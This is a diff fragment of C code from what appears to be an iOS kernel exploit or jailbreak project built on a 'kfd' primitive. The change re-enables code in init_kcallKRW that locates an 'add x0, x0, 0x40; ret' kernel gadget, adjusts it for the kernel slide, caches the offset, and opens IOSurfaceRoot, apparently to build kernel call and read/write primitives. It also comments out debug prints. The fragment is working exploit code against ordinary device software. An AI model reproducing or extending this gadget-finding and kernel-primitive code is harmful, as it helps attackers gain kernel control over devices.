@@ -193,28 +193,37 @@ uint64_t fake_client;
 mach_port_t user_client;
 
 uint64_t init_kcallKRW(void) {
-    /* struct kfd* kfd_struct = (struct kfd*)FINAL_KFD;
+     struct kfd* kfd_struct = (struct kfd*)FINAL_KFD;
     uint64_t add_x0_x0_0x40_ret_func = 0;
     init_kernel(kfd_struct);
    // printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
     add_x0_x0_0x40_ret_func = getOffset(0);
-    printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
+   // printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
 
     if (add_x0_x0_0x40_ret_func == 0) {
         add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);//18446744005236302004
-        printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
+     //   printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
 
         off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;//18446744005083553972
-        printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
+       // printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
 
         setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
-        printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
+        //printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
 
     } else {
+ //       printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
+  //      printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
+
         add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
-        off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;//18446744005086625264
+        off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;
+        setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
+
+    //    printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
+    //    printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
+
+        //18446744005086625264
     }
-    */
+    
     
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == IO_OBJECT_NULL){
